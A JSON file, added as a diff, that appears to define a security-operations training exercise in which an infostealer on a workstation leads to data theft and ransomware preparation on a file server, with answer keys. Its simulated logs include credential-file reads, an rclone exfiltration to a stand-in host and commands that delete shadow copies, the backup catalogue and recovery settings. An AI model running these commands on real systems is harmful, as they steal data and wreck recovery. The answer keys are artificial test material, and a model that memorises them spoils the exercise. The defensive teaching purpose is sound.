@@ -1,0 +1,857 @@
+{
+ "id": "shift-03",
+ "title": "Night shift: Halstead & Rowe",
+ "agency": "Lanternfield Security Operations",
+ "client": "Halstead & Rowe",
+ "date": "Wednesday 18 November",
+ "startsAt": "23:50",
+ "minutes": 25,
+ "xp": 120,
+ "summary": "An EDR alert on a workstation, then the file server starts behaving oddly overnight. Work out whether it's one attack, contain it before anything is encrypted, and hand over.",
+ "card": "A malware alert, a quiet night, and a server under attack",
+ "lessons": [
+  "malware",
+  "ransomware",
+  "data-breach",
+  "incident-response",
+  "soc"
+ ],
+ "briefing": "Night shift. Halstead & Rowe, an accountancy firm, almost no one works overnight. Two alerts are in and a couple more may land while you work. Anything on the file server (FS01) that holds client data comes first. Check each one properly, link what belongs together, and get the other teams to act. The clock only moves when you do something.",
+ "lead": "Morgan, shift lead",
+ "leadPhoto": "img/agency/morgan.webp",
+ "handedOverBy": "the evening shift",
+ "next": {
+  "href": "#lab-ransomware-timeline",
+  "label": "Read a ransomware timeline"
+ },
+ "simplification": "Simplified simulation: a real shift has more alerts and far longer logs. The EDR and file-server timelines are generic SIEM exports written for this shift; the Windows tool names (wscript, powershell, vssadmin, wbadmin, bcdedit) and the attacker's use of rclone are real, and the -EncodedCommand text is shortened. Documentation addresses have no real location, so there are no countries here. Department replies are scripted. All people and companies are fictional.",
+ "costs": {
+  "search": 1,
+  "request": 2,
+  "close": 3,
+  "wait": 5
+ },
+ "sources": {
+  "edr": {
+   "name": "EDR timeline: HAL-PC-07 (SIEM export)",
+   "about": "What the endpoint agent saw on j.doyle's workstation. Generic format; indented actions are child processes. Simplified for this shift.",
+   "lines": [
+    "2026-11-18 21:58:12 host=HAL-PC-07 user=j.doyle op=file path=\"C:\\Users\\j.doyle\\Downloads\\Statement_Nov.pdf.js\" by=chrome.exe note=\"saved from an email link\"",
+    "2026-11-18 21:58:40 host=HAL-PC-07 user=j.doyle op=process proc=wscript.exe cmd=\"wscript Statement_Nov.pdf.js\"",
+    "2026-11-18 21:58:42 host=HAL-PC-07 user=j.doyle op=process parent=wscript.exe proc=powershell.exe cmd=\"powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A...\"",
+    "2026-11-18 21:58:45 host=HAL-PC-07 user=j.doyle op=file path=\"C:\\Users\\j.doyle\\AppData\\Roaming\\WinUpd\\winupd.exe\" note=\"created, unsigned\"",
+    "2026-11-18 21:58:47 host=HAL-PC-07 user=j.doyle op=process parent=powershell.exe proc=winupd.exe",
+    "2026-11-18 21:58:49 host=HAL-PC-07 user=j.doyle op=network proc=winupd.exe dst=203.0.113.45:443 note=\"first seen in the company today\"",
+    "2026-11-18 22:14:03 host=HAL-PC-07 user=j.doyle op=fileread proc=winupd.exe path=\"C:\\Users\\j.doyle\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"",
+    "2026-11-18 22:14:05 host=HAL-PC-07 user=j.doyle op=network proc=winupd.exe dst=203.0.113.45:443 sent=2.1MB",
+    "2026-11-18 22:15:10 host=HAL-PC-07 user=j.doyle op=network proc=winupd.exe dst=203.0.113.45:443 note=\"every 60 seconds since (beacon)\""
+   ],
+   "findings": [
+    {
+     "id": "pdfjs",
+     "match": "Statement_Nov.pdf.js",
+     "finding": "j.doyle opened Statement_Nov.pdf.js, a script disguised as a PDF (Windows hides the real .js extension), saved from an email link."
+    },
+    {
+     "id": "enc-ps",
+     "match": "-EncodedCommand",
+     "finding": "wscript ran hidden, encoded PowerShell, which created and ran winupd.exe."
+    },
+    {
+     "id": "winupd",
+     "match": "winupd.exe\" note=\"created, unsigned",
+     "finding": "winupd.exe, an unsigned program, was created in AppData and run."
+    },
+    {
+     "id": "beacon",
+     "match": "every 60 seconds since (beacon)",
+     "finding": "winupd.exe beacons to 203.0.113.45 every 60 seconds: its command-and-control (C2) server."
+    },
+    {
+     "id": "stealer",
+     "match": "path=\"C:\\Users\\j.doyle\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"",
+     "finding": "winupd.exe read Chrome's saved logins, then sent 2.1 MB to 203.0.113.45: it's an infostealer."
+    }
+   ]
+  },
+  "server": {
+   "name": "Activity timeline: FS01 (SIEM export)",
+   "about": "Logons, processes and network activity on the file server FS01. Generic format; the tool names are Windows's. Simplified for this shift.",
+   "lines": [
+    "2026-11-18 20:05:02 host=FS01 user=svc-backup op=backup job=\"Nightly-FS01\" note=\"started, scheduled 20:00, target BACKUP01\"",
+    "2026-11-18 22:40:11 host=FS01 user=svc-backup op=logon type=\"RemoteInteractive (RDP)\" src=HAL-PC-07",
+    "2026-11-18 22:52:19 host=FS01 user=svc-backup op=process proc=rclone.exe cmd=\"rclone copy D:\\Clients sync:offsite --transfers 8\"",
+    "2026-11-18 22:52:21 host=FS01 user=svc-backup op=network proc=rclone.exe dst=198.51.100.77:443 note=\"sync.fileshare.example\"",
+    "2026-11-18 23:31:55 host=FS01 user=svc-backup op=network proc=rclone.exe note=\"connection closed: 23.4 GB sent\"",
+    "2026-11-18 23:36:02 host=FS01 user=svc-backup op=process proc=vssadmin.exe cmd=\"vssadmin delete shadows /all /quiet\"",
+    "2026-11-18 23:36:05 host=FS01 user=svc-backup op=process proc=wbadmin.exe cmd=\"wbadmin delete catalog -quiet\"",
+    "2026-11-18 23:36:40 host=FS01 user=svc-backup op=process proc=bcdedit.exe cmd=\"bcdedit /set {default} recoveryenabled No\"",
+    "2026-11-18 23:48:30 host=FS01 user=svc-backup op=backup job=\"Nightly-FS01\" note=\"finished: 1 TB, 3h43m (usual 1h50m), reason: extra data from migration CHG-4120\""
+   ],
+   "findings": [
+    {
+     "id": "rdp-svc",
+     "match": "op=logon type=\"RemoteInteractive (RDP)\" src=HAL-PC-07",
+     "finding": "The svc-backup account signed in to FS01 over RDP from HAL-PC-07 (the infected workstation) at 22:40. A backup service account should never log on interactively."
+    },
+    {
+     "id": "rclone-run",
+     "match": "rclone copy D:\\Clients",
+     "finding": "At 22:52, rclone copied the whole D:\\Clients folder off FS01 to offsite cloud storage, run as svc-backup."
+    },
+    {
+     "id": "rclone-out",
+     "match": "connection closed: 23.4 GB sent",
+     "finding": "23.4 GB left FS01 for 198.51.100.77 (sync.fileshare.example) between 22:52 and 23:31: client data was exfiltrated."
+    },
+    {
+     "id": "vss-del",
+     "match": "vssadmin delete shadows",
+     "finding": "At 23:36 svc-backup deleted Windows shadow copies on FS01 (vssadmin delete shadows)."
+    },
+    {
+     "id": "wbadmin",
+     "match": "wbadmin delete catalog",
+     "finding": "It also deleted the backup catalogue (wbadmin) and turned off recovery (bcdedit): the step just before ransomware encrypts."
+    },
+    {
+     "id": "veeam-long",
+     "match": "reason: extra data from migration CHG-4120",
+     "finding": "The Nightly-FS01 backup ran long (3h43m) because of extra data from the approved migration CHG-4120."
+    },
+    {
+     "id": "veeam-start",
+     "match": "started, scheduled 20:00, target BACKUP01",
+     "finding": "The overnight Veeam backup started on schedule at 20:00, to BACKUP01, as it does every night."
+    }
+   ]
+  },
+  "notes": {
+   "name": "Client notes: Halstead & Rowe",
+   "about": "What Lanternfield knows about this client: systems, accounts, backups and recent changes.",
+   "lines": [
+    "Client: Halstead & Rowe, accountancy practice, about 80 staff, one office. Lanternfield monitors their EDR, sign-ins and network.",
+    "On-call client IT: Marcus Bell, reachable until 02:00. Report confirmed incidents to Marcus.",
+    "Office internet address: 203.0.113.12. Staff work 08:00 to 18:00, so there's little legitimate activity overnight.",
+    "Servers: FS01 holds client files in D:\\Clients. Backups: Veeam to BACKUP01 every night; a second copy to BACKUP02, which is kept off the domain and immutable for 30 days.",
+    "Account svc-backup runs the Veeam backup service. It should never log on interactively (RDP) or reach the internet.",
+    "CHG-4120 (approved, last night): a data migration that adds about 500 GB to FS01, so the nightly backup will run longer than usual.",
+    "Yesterday: the antivirus quarantined an adware bundle (a PUP) on RECEPTION-PC; it was cleaned and the ticket closed.",
+    "MFA is on for staff sign-ins. Service accounts like svc-backup use a long password, with no MFA.",
+    "Network Ops can block single addresses on request. Cutting the office off the internet needs the client's say-so."
+   ],
+   "findings": [
+    {
+     "id": "oncall",
+     "match": "Marcus Bell",
+     "finding": "On-call client IT is Marcus Bell, reachable until 02:00; confirmed incidents go to him."
+    },
+    {
+     "id": "svcbackup-note",
+     "match": "should never log on interactively (RDP) or reach the internet",
+     "finding": "Client notes: svc-backup runs the backup service and should never log on interactively or reach the internet."
+    },
+    {
+     "id": "offline-backup",
+     "match": "immutable for 30 days",
+     "finding": "Client notes: a second backup on BACKUP02 is kept off the domain and immutable for 30 days, so svc-backup can't delete or change it."
+    },
+    {
+     "id": "chg4120",
+     "match": "CHG-4120",
+     "finding": "Client notes: CHG-4120, an approved data migration, adds about 500 GB to FS01, so the nightly backup runs longer than usual."
+    },
+    {
+     "id": "av-note",
+     "match": "RECEPTION-PC",
+     "finding": "Client notes: the antivirus quarantined and cleaned an adware PUP on RECEPTION-PC yesterday; the ticket is closed."
+    }
+   ]
+  }
+ },
+ "alerts": [
+  {
+   "id": "a1",
+   "ref": "SOC-31204",
+   "title": "Malware running on a workstation: HAL-PC-07",
+   "time": "21:59",
+   "severity": "high",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "EDR on HAL-PC-07 (user j.doyle): a script from Downloads ran hidden PowerShell and an unsigned program (winupd.exe) that is beaconing to an external address.",
+   "guide": {
+    "hints": [
+     "Open the EDR timeline for HAL-PC-07 and read it top to bottom. What did the user open, and what did it start?",
+     "A file ending .pdf.js is a script, not a PDF. Follow the chain: hidden PowerShell, an unsigned program, then a connection out. Where does winupd.exe connect, and how often?",
+     "It's an infostealer: it read Chrome's saved logins and beacons to 203.0.113.45. Isolate HAL-PC-07, reset j.doyle (end her sessions), and block the C2 address. Link it to what happens on FS01."
+    ],
+    "searches": [
+     [
+      "edr",
+      "pdf.js"
+     ],
+     [
+      "edr",
+      "winupd.exe"
+     ],
+     [
+      "edr",
+      "203.0.113.45"
+     ]
+    ]
+   },
+   "sources": [
+    "edr",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:isolate-pc",
+    "identity:reset-jdoyle",
+    "netops:block-c2",
+    "servicedesk:call-jdoyle"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "pdfjs"
+     ],
+     "text": "EDR: j.doyle opened Statement_Nov.pdf.js, a script disguised as a PDF, from an email link",
+     "supports": true,
+     "required": true,
+     "why": "This is how it got in: a double-clicked script, not a document."
+    },
+    {
+     "findings": [
+      "enc-ps",
+      "winupd"
+     ],
+     "text": "EDR: it ran hidden, encoded PowerShell that created and ran the unsigned winupd.exe",
+     "supports": true,
+     "required": true,
+     "why": "A script from Downloads starting hidden PowerShell and an unsigned binary is malware, not an app."
+    },
+    {
+     "findings": [
+      "beacon"
+     ],
+     "text": "EDR: winupd.exe beacons to 203.0.113.45 every 60 seconds",
+     "supports": true,
+     "required": true,
+     "why": "Regular check-ins to a new external address are the malware talking to its command-and-control server."
+    },
+    {
+     "findings": [
+      "stealer"
+     ],
+     "text": "EDR: winupd.exe read Chrome's saved logins and sent 2.1 MB out",
+     "supports": true,
+     "required": false,
+     "why": "Shows what it took: saved passwords, which explains what happens next on the server."
+    },
+    {
+     "findings": [
+      "jdoyle-confirms"
+     ],
+     "text": "Service Desk: j.doyle says she opened a 'client statement' from an email",
+     "supports": true,
+     "required": false,
+     "why": "Confirms the entry point from the person, and fits the logs."
+    },
+    {
+     "text": "The company antivirus would have caught anything dangerous, so this is a false positive",
+     "supports": false,
+     "required": false,
+     "why": "The EDR flagged it because the antivirus didn't. An unsigned program reading passwords and beaconing out is live, not handled."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "high",
+     "critical"
+    ],
+    "related": [
+     "a2",
+     "a3"
+    ],
+    "contain": [
+     "endpoint:isolate-pc",
+     "identity:reset-jdoyle",
+     "netops:block-c2"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "HAL-PC-07 (j.doyle) ran an infostealer: a .pdf.js script started hidden PowerShell and unsigned winupd.exe, which read Chrome's saved logins, sent 2.1 MB out and beacons to 203.0.113.45. Workstation isolated, j.doyle reset with sessions ended, C2 blocked. The stolen logins were used on FS01 (see SOC-31206/07).",
+     "A malware alert on j.doyle's PC. Antivirus should deal with it; no action.",
+     "Possible malware on HAL-PC-07. Suggest j.doyle runs a scan when she's next in."
+    ],
+    "summary": 0,
+    "why": "The data has already left, so resetting the password isn't enough on its own: isolate the machine and end the user's sessions, because stolen cookies and tokens can keep an attacker in. Block the C2 address, and rebuild the laptop rather than trust a clean-up. The logins it stole are what gets used on the server next."
+   }
+  },
+  {
+   "id": "a2",
+   "ref": "SOC-31206",
+   "title": "Large transfer from the file server: FS01",
+   "time": "23:33",
+   "severity": "high",
+   "arrives": {
+    "closed": 2,
+    "at": 20
+   },
+   "detection": "FS01 sent about 23 GB to an external cloud address overnight, by the svc-backup account, using rclone.",
+   "guide": {
+    "hints": [
+     "Open the FS01 timeline. Who signed in, from where, and what did they run? Compare it with what svc-backup is supposed to do.",
+     "rclone is a legitimate sync tool that attackers use to steal data. Where did the 23 GB go, and is that address anything to do with the backups in the notes?",
+     "The stolen logins from HAL-PC-07 were used to RDP into FS01 as svc-backup and copy D:\\Clients out: a data breach. Isolate FS01, block the destination, and report it to the client. Link it to the workstation and the backup deletion."
+    ],
+    "searches": [
+     [
+      "server",
+      "rclone"
+     ],
+     [
+      "server",
+      "RemoteInteractive"
+     ],
+     [
+      "notes",
+      "should never log on"
+     ]
+    ]
+   },
+   "sources": [
+    "server",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:isolate-fs01",
+    "netops:block-dest",
+    "client:report-incident",
+    "identity:disable-svcbackup"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "rclone-run",
+      "rclone-out"
+     ],
+     "text": "FS01: rclone copied D:\\Clients and sent 23.4 GB to 198.51.100.77 (sync.fileshare.example)",
+     "supports": true,
+     "required": true,
+     "why": "Client files leaving for an outside address is the breach: this is data being stolen, not backed up."
+    },
+    {
+     "findings": [
+      "rdp-svc"
+     ],
+     "text": "FS01: svc-backup signed in over RDP from HAL-PC-07, the infected workstation",
+     "supports": true,
+     "required": true,
+     "why": "Ties the server activity to the stolen logins from the workstation."
+    },
+    {
+     "findings": [
+      "svcbackup-note"
+     ],
+     "text": "Client notes: svc-backup runs the backup service and should never log on interactively or reach the internet",
+     "supports": true,
+     "required": false,
+     "why": "Makes it clear this isn't the backup account doing its job."
+    },
+    {
+     "text": "23 GB is a lot, but it's the svc-backup account, so it's just the nightly backup copying data offsite",
+     "supports": false,
+     "required": false,
+     "why": "The real backup goes to BACKUP01 on schedule. rclone to an outside address isn't the backup: it's theft using the stolen account."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "critical",
+     "high"
+    ],
+    "related": [
+     "a1",
+     "a3"
+    ],
+    "contain": [
+     "endpoint:isolate-fs01",
+     "netops:block-dest",
+     "client:report-incident"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "Data breach: logins stolen from HAL-PC-07 were used to RDP into FS01 as svc-backup and copy D:\\Clients to 198.51.100.77 (sync.fileshare.example). 23.4 GB of client data left between 22:52 and 23:31. FS01 isolated, the destination blocked, Marcus told so the firm can meet its breach duties.",
+     "The svc-backup account copied data offsite. That's what backups do; no action.",
+     "Large transfer from FS01. Worth asking the client about the backup settings tomorrow."
+    ],
+    "summary": 0,
+    "why": "Stealing the data before anything is encrypted is now the standard play (double extortion): even if the files are recovered, client data has left the building. That makes it a personal data breach the firm has to assess and, if people are at risk, report to the ICO. Stop more leaving (isolate the server, block the address) and get it to the client."
+   }
+  },
+  {
+   "id": "a3",
+   "ref": "SOC-31207",
+   "title": "Backups being deleted on FS01",
+   "time": "23:37",
+   "severity": "critical",
+   "arrives": {
+    "closed": 2,
+    "at": 22
+   },
+   "detection": "On FS01, the svc-backup account is deleting Windows shadow copies and the backup catalogue and turning off recovery: a common step just before ransomware encrypts.",
+   "guide": {
+    "hints": [
+     "This is the dangerous one. Open the FS01 timeline and look at what svc-backup ran just after the transfer finished.",
+     "vssadmin delete shadows, wbadmin delete catalog and bcdedit recoveryenabled No all remove ways to recover. Nothing is encrypted yet, so there's a chance to stop it. What's the fastest way to cut this account off FS01?",
+     "Caught before encryption. Isolate FS01 now, disable svc-backup and end its sessions, and get Marcus on the phone. Check the notes: the immutable BACKUP02 copy should still be safe. Link it to the other two alerts."
+    ],
+    "searches": [
+     [
+      "server",
+      "vssadmin"
+     ],
+     [
+      "server",
+      "wbadmin"
+     ],
+     [
+      "server",
+      "RemoteInteractive"
+     ],
+     [
+      "notes",
+      "immutable for 30 days"
+     ]
+    ]
+   },
+   "sources": [
+    "server",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:isolate-fs01",
+    "identity:disable-svcbackup",
+    "client:report-incident",
+    "netops:block-office",
+    "client:check-backup"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "vss-del",
+      "wbadmin"
+     ],
+     "text": "FS01: at 23:36 shadow copies and the backup catalogue were deleted and recovery was turned off",
+     "supports": true,
+     "required": true,
+     "why": "Destroying the ways to recover is the last step before encryption. It's an emergency, not maintenance."
+    },
+    {
+     "findings": [
+      "rdp-svc"
+     ],
+     "text": "FS01: it was done by svc-backup, the same account used for the RDP logon and the transfer",
+     "supports": true,
+     "required": true,
+     "why": "Same account, same session: this is the same attacker, now wrecking recovery."
+    },
+    {
+     "findings": [
+      "offline-backup"
+     ],
+     "text": "Client notes: the immutable copy on BACKUP02 is off the domain and can't be deleted with svc-backup",
+     "supports": true,
+     "required": false,
+     "why": "Good news to hand over: the one backup the attacker can't reach is the one that matters."
+    },
+    {
+     "text": "The backup service account is just tidying up old backups, so this is routine maintenance",
+     "supports": false,
+     "required": false,
+     "why": "Deleting shadow copies and the catalogue and disabling recovery is destruction, not tidying. It's the signature move before ransomware runs."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "critical"
+    ],
+    "related": [
+     "a1",
+     "a2"
+    ],
+    "contain": [
+     "endpoint:isolate-fs01",
+     "identity:disable-svcbackup",
+     "client:report-incident"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "Ransomware caught in progress: using svc-backup, the attacker deleted shadow copies and the backup catalogue and turned off recovery on FS01 at 23:36, the step before encryption. FS01 isolated and svc-backup disabled before any files were encrypted; the immutable BACKUP02 copy is intact; Marcus told. One incident with SOC-31204 and SOC-31206.",
+     "svc-backup deleted some old backups. Routine; no action.",
+     "Backups changing on FS01. Recommend the client reviews their backup retention."
+    ],
+    "summary": 0,
+    "why": "Deleting shadow copies and the catalogue is the move right before encryption, so speed matters: isolating FS01 and disabling the account can stop the encryption stage entirely. Keep the machine powered on so memory evidence survives, and lean on the backup you kept offline and immutable (BACKUP02), which is exactly why that copy exists."
+   }
+  },
+  {
+   "id": "a4",
+   "ref": "SOC-31199",
+   "title": "Antivirus quarantine on a reception PC",
+   "time": "23:41",
+   "severity": "low",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "Antivirus on RECEPTION-PC reported a quarantined item in its overnight summary.",
+   "guide": {
+    "hints": [
+     "A quarantine means the antivirus already stopped something. Check the client notes before you treat it as live.",
+     "The notes mention RECEPTION-PC. What was it, and is the ticket still open? Don't tie up a reception machine over something already dealt with."
+    ],
+    "searches": [
+     [
+      "notes",
+      "RECEPTION-PC"
+     ]
+    ]
+   },
+   "sources": [
+    "notes"
+   ],
+   "requests": [
+    "endpoint:isolate-reception"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "av-note"
+     ],
+     "text": "Client notes: the adware PUP on RECEPTION-PC was quarantined and cleaned yesterday, and the ticket is closed",
+     "supports": true,
+     "required": true,
+     "why": "The antivirus already removed it; the alert is just last night's summary repeating a closed item."
+    },
+    {
+     "text": "Any malware detection means a compromised machine, so isolate RECEPTION-PC now",
+     "supports": false,
+     "required": false,
+     "why": "The item was caught and cleaned, and it's a low-risk adware bundle, not the server incident. Isolating a reception PC over a closed ticket wastes the client's time."
+    }
+   ],
+   "answer": {
+    "verdict": "legit",
+    "severity": [
+     "low"
+    ],
+    "related": [],
+    "contain": [],
+    "status": "closed",
+    "summaries": [
+     "False alarm: the antivirus summary repeated yesterday's quarantine of an adware PUP on RECEPTION-PC, already cleaned and the ticket closed. No action.",
+     "Malware on RECEPTION-PC. Isolated the machine as a precaution.",
+     "Reception PC flagged by antivirus. Escalated to the client for a rebuild."
+    ],
+    "summary": 0,
+    "why": "A quarantine is the antivirus doing its job. Check whether it's already handled before acting: here it was cleaned yesterday and the ticket is closed, so this is noise, not part of tonight's incident."
+   }
+  },
+  {
+   "id": "a5",
+   "ref": "SOC-31201",
+   "title": "Overnight backup moved far more data than usual",
+   "time": "23:49",
+   "severity": "medium",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "FS01's nightly Veeam backup ran for 3h43m and moved about 1 TB, well over its usual size.",
+   "guide": {
+    "hints": [
+     "A backup touching a lot of data can be ransomware, or it can be a big, planned change. Check the backup job and the client notes.",
+     "The job is the scheduled Nightly-FS01 to BACKUP01. Is there a change that would explain the extra data? Don't stop the client's backup over a planned migration."
+    ],
+    "searches": [
+     [
+      "server",
+      "Nightly-FS01"
+     ],
+     [
+      "notes",
+      "CHG-4120"
+     ]
+    ]
+   },
+   "sources": [
+    "server",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:pause-backup"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "veeam-long",
+      "chg4120"
+     ],
+     "text": "FS01 and notes: the Nightly-FS01 backup ran long because of the approved CHG-4120 migration (about 500 GB extra)",
+     "supports": true,
+     "required": true,
+     "why": "The size is explained by a planned change, not by an attack."
+    },
+    {
+     "findings": [
+      "veeam-start"
+     ],
+     "text": "FS01: the backup started on schedule at 20:00, to BACKUP01, as every night",
+     "supports": true,
+     "required": false,
+     "why": "Right job, right time, right target: it's the normal backup, just bigger."
+    },
+    {
+     "text": "A backup process touching huge amounts of data overnight is how ransomware looks, so treat it as an incident",
+     "supports": false,
+     "required": false,
+     "why": "The real danger tonight is the deletion of backups at 23:36, not this scheduled job to BACKUP01 that matches an approved migration."
+    }
+   ],
+   "answer": {
+    "verdict": "legit",
+    "severity": [
+     "low",
+     "medium"
+    ],
+    "related": [],
+    "contain": [],
+    "status": "closed",
+    "summaries": [
+     "False alarm: the nightly Veeam backup to BACKUP01 ran long (about 1 TB) because of the approved CHG-4120 migration, which added roughly 500 GB. On schedule, right target. Worth tuning the size rule.",
+     "Backup on FS01 moved too much data overnight. Paused the backup job to be safe.",
+     "Large backup on FS01, possibly ransomware. Escalated to the client."
+    ],
+    "summary": 0,
+    "why": "A size rule can't tell a big planned backup from an attack. The change calendar can: CHG-4120 explains the extra 500 GB, and the job ran on schedule to BACKUP01. Don't confuse it with the backup deletion on the same server, which is the real incident."
+   }
+  }
+ ],
+ "departments": {
+  "identity": {
+   "name": "Identity & Access",
+   "contact": {
+    "name": "Priya Raman",
+    "photo": "img/agency/priya.webp",
+    "role": "Identity & Access"
+   },
+   "requests": [
+    {
+     "id": "reset-jdoyle",
+     "label": "Reset j.doyle's password, end all her sessions and reset her stored tokens",
+     "minutes": 10,
+     "replies": [
+      {
+       "when": {
+        "attached": ""
+       },
+       "minutes": 4,
+       "outcome": "asks",
+       "text": "Happy to, but put a reason on the ticket first. Attach a finding and send it again."
+      },
+      {
+       "outcome": "done",
+       "text": "Done. j.doyle's password is reset, every session is ended and her refresh tokens are revoked, so the stolen cookies are no use. She'll need to sign in again in the morning."
+      }
+     ]
+    },
+    {
+     "id": "disable-svcbackup",
+     "label": "Disable the svc-backup account and end its sessions",
+     "minutes": 8,
+     "replies": [
+      {
+       "when": {
+        "attached": ""
+       },
+       "minutes": 4,
+       "outcome": "asks",
+       "text": "That's the backup service account, so disabling it will stop tonight's backups. Give me a reason on the ticket and I'll do it."
+      },
+      {
+       "outcome": "done",
+       "text": "Done. svc-backup is disabled and its sessions on FS01 are ended, so whoever was using it is cut off. Tonight's Veeam job won't run again, but the immutable copy is already safe."
+      }
+     ]
+    }
+   ]
+  },
+  "endpoint": {
+   "name": "Endpoint & Email Security",
+   "contact": {
+    "name": "Elliot Marsh",
+    "photo": "img/agency/elliot.webp",
+    "role": "Endpoint & Email Security"
+   },
+   "requests": [
+    {
+     "id": "isolate-pc",
+     "label": "Isolate HAL-PC-07 from the network (leave it powered on)",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. HAL-PC-07 is isolated: it can only reach our tools now, so winupd.exe can't call home or spread. Still powered on, so memory is kept for the investigation."
+      }
+     ]
+    },
+    {
+     "id": "isolate-fs01",
+     "label": "Isolate FS01 from the network (leave it powered on)",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. FS01 is isolated and still powered on. The transfer out is cut and nothing more can be reached from it. Memory is preserved for the investigation."
+      }
+     ]
+    },
+    {
+     "id": "isolate-reception",
+     "label": "Isolate RECEPTION-PC from the network",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done, RECEPTION-PC is isolated. For what it's worth, the antivirus already cleaned that one yesterday, so reception will be without their PC in the morning for nothing.",
+       "cost": "Isolated a reception PC over an adware item the antivirus had already cleaned, which the client notes flagged as a closed ticket."
+      }
+     ]
+    },
+    {
+     "id": "pause-backup",
+     "label": "Pause the Nightly-FS01 backup job",
+     "minutes": 5,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done, the Nightly-FS01 job is paused. Note this was the real scheduled backup to BACKUP01, so the firm now has no fresh backup from tonight.",
+       "cost": "Paused the genuine nightly backup, which was only large because of the approved CHG-4120 migration, leaving the client without tonight's backup."
+      }
+     ]
+    }
+   ]
+  },
+  "netops": {
+   "name": "Network Operations",
+   "contact": {
+    "name": "Tomasz Nowak",
+    "photo": "img/agency/tomasz.webp",
+    "role": "Network Operations"
+   },
+   "requests": [
+    {
+     "id": "block-c2",
+     "label": "Block 203.0.113.45 at the edge for the whole company",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. 203.0.113.45 is blocked at the edge, so nothing at Halstead & Rowe can reach that C2 address. No other hosts were talking to it."
+      }
+     ]
+    },
+    {
+     "id": "block-dest",
+     "label": "Block 198.51.100.77 (sync.fileshare.example) at the edge",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. 198.51.100.77 is blocked, so no more can be uploaded there. The 23.4 GB that already went is gone, though: blocking it now doesn't bring it back."
+      }
+     ]
+    },
+    {
+     "id": "block-office",
+     "label": "Cut the whole office off the internet",
+     "minutes": 5,
+     "replies": [
+      {
+       "outcome": "refused",
+       "text": "I can't pull the whole office offline without the client's say-so, and it's a blunt instrument. If you want the attacker cut off now, ask us to isolate FS01 and block the two addresses instead and we'll do it straight away."
+      }
+     ]
+    }
+   ]
+  },
+  "servicedesk": {
+   "name": "Service Desk",
+   "contact": {
+    "name": "Grace Adeyemi",
+    "photo": "img/agency/grace.webp",
+    "role": "Service Desk"
+   },
+   "requests": [
+    {
+     "id": "call-jdoyle",
+     "label": "Call j.doyle about the file she opened",
+     "minutes": 10,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Reached j.doyle at home. She says an email looked like a client statement, so she opened the attachment; nothing seemed to happen, so she left for the day. She hasn't been on the server tonight.",
+       "finding": {
+        "id": "jdoyle-confirms",
+        "finding": "Service Desk: j.doyle opened the 'client statement' attachment, saw nothing happen, and hasn't used FS01 tonight."
+       }
+      }
+     ]
+    }
+   ]
+  },
+  "client": {
+   "name": "Marcus Bell (Halstead & Rowe IT)",
+   "contact": {
+    "name": "Marcus Bell",
+    "role": "Client: Halstead & Rowe IT"
+   },
+   "requests": [
+    {
+     "id": "report-incident",
+     "label": "Report a confirmed incident: malware on HAL-PC-07, client data taken from FS01, backups being deleted",
+     "minutes": 15,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Thanks for catching this tonight. I'm on it: I'll keep FS01 and HAL-PC-07 off the network, start our incident plan and get our data protection lead to assess the breach. Send me the timeline when you can."
+      }
+     ]
+    },
+    {
+     "id": "check-backup",
+     "label": "Confirm the immutable BACKUP02 copy is intact and untouched",
+     "minutes": 10,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Checked: BACKUP02 is off the domain and immutable, and tonight's copy is intact. svc-backup can't touch it. If the worst had happened we could have restored from it.",
+       "finding": {
+        "id": "backup-safe",
+        "finding": "Client: the immutable BACKUP02 copy is intact and out of svc-backup's reach, so recovery is possible even though the live backups were deleted."
+       }
+      }
+     ]
+    }
+   ]
+  }
+ },
+ "handover": {
+  "links": "Three alerts were one attack: the malware on HAL-PC-07 stole j.doyle's saved logins, which were used to RDP into FS01 as svc-backup, copy client data out, then delete the backups ready to encrypt. Seeing them as one incident is the whole job.",
+  "model": "Real incident, caught before encryption: j.doyle opened Statement_Nov.pdf.js on HAL-PC-07, which ran an infostealer (winupd.exe, beaconing to 203.0.113.45) that took her saved logins. At 22:40 those logins were used to RDP into FS01 as svc-backup; rclone copied D:\\Clients to 198.51.100.77 (sync.fileshare.example), 23.4 GB, a data breach; then at 23:36 shadow copies and the backup catalogue were deleted and recovery turned off, the step before encryption. HAL-PC-07 and FS01 isolated (powered on), j.doyle reset and svc-backup disabled, C2 and exfil addresses blocked, Marcus told so the firm can run its incident plan and assess the breach. BACKUP02 (off-domain, immutable) is intact. Noise: the RECEPTION-PC antivirus quarantine (already cleaned) and the oversized but scheduled Veeam backup (CHG-4120). Next shift: look for the stolen logins used elsewhere, check other servers for rclone and svc-backup logons, and confirm nothing was encrypted."
+ }
+}
